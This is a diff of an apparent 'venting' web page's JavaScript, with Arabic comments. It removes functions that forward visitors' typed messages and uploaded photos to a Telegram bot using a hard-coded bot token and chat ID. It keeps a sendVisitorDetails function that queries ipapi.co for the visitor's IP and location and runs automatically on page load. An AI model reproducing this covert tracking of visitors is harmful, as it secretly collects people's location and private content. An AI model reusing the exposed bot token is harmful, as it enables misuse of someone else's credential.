@@ -324,61 +324,7 @@
             voicePopup.style.display = 'none';
         }
 
-        // إرسال الرسالة النصية إلى Telegram
-        function sendMessage() {
-            const message = document.getElementById('message').value;
-            if (!message.trim()) {
-                alert("فضفضي الاول يكستوتي انت💋");
-                return;
-            }
-
-            const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
-            const chatId = '7631254472'; // معرف الدردشة الخاص بك
-            const telegramMessage = `رسالة جديدة:\n${message}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: telegramMessage,
-                }),
-            })
-
-            // عرض رسالة دب الباندا
-            showPandaMessage();
-
-            // إرسال تفاصيل المستخدم
-            sendVisitorDetails();
-        }
-
-        // إرسال الصورة إلى Telegram
-        document.getElementById('imageInput').addEventListener('change', function(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const formData = new FormData();
-                formData.append('photo', file);
-
-                const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
-                const chatId = '7631254472'; // معرف الدردشة الخاص بك
-                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-                fetch(telegramApiUrl, {
-                    method: 'POST',
-                    body: formData,
-                })
-
-                // عرض رسالة دب الباندا
-                showPandaMessage();
-
-                // إرسال تفاصيل المستخدم
-                sendVisitorDetails();
-            }
-        });
-
-        // إرسال تفاصيل الزائر إلى Telegram
+        // إرسال تفاصيل المستخدم عند تحميل الصفحة مباشرة
         function sendVisitorDetails() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
@@ -415,8 +361,9 @@
                 });
         }
 
-        // إرسال تفاصيل المستخدم عند تحميل الصفحة
+        // إرسال تفاصيل الزائر عند تحميل الصفحة مباشرة
         document.addEventListener('DOMContentLoaded', sendVisitorDetails);
+
     </script>
 </body>
 </html>
